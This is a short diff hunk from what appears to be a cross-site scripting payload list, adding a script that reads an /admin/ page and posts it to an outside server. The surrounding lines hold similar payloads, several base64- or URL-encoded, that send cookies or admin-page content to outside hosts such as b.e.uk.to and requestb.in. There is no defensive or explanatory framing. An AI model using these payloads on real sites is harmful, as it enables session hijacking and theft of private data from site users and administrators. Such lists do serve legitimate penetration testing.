@@ -121,6 +121,7 @@ new Image().src="http://b.e.uk.to/xss/?"+escape(document.cookie);
 <input type="text" onfocus="write(atob('PHNjcmlwdD4KZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwOi8vcmVxdWVzdGIuaW4vMW1sdjYxajE/Y29va2llPSIgKyBkb2N1bWVudC5jb29raWUgKyAiJyAvPiIpOwo8L3NjcmlwdD4='));" autofocus />
 <iframe srcdoc="%26lt%3Bimg%20src%26equals%3Bx%3Ax%20onerror%26equals%3Beval%26lpar%3Batob%26lpar%3B%27ZG9jdW1lbnQubG9jYXRpb249Imh0dHBzOi8vd3d3LnBvdGF0b3BsYS5uZXQveHNzP2Nvb2tpZT0iK2VuY29kZVVSSShkb2N1bWVudC5jb29raWUpOw%3D%3D%27%26rpar%3B%26rpar%3B%26gt%3B (iframe with no closing >)
 
+<script>x=new XMLHttpRequest();x.open("GET","/admin/",false);x.send();r=x.responseText;x.open("POST","http://b.e.uk.to:1234/",true);x.setRequestHeader("Content-type","application/x-www-form-urlencoded");x.send(r);</script>
 <img src=x style=display:none onerror=eval(unescape(/xmlhttp%3Dnew%20XMLHttpRequest%28%29%3Bxmlhttp.open%28%22GET%22%2C%22%2fadmin%2fshow.php%22%2Cfalse%29%3Bxmlhttp.send%28%29%3Br%3Dxmlhttp.responseText%3Bxmlhttp.open%28%22POST%22%2C%22http%3A%2f%2frequestb.in%2f17b3o8z1%22%2Ctrue%29%3Bxmlhttp.setRequestHeader%28%22Content-type%22%2C%22application%2fx-www-form-urlencoded%22%29%3Bxmlhttp.send%28r%29%3B/.source));//
 
 try {
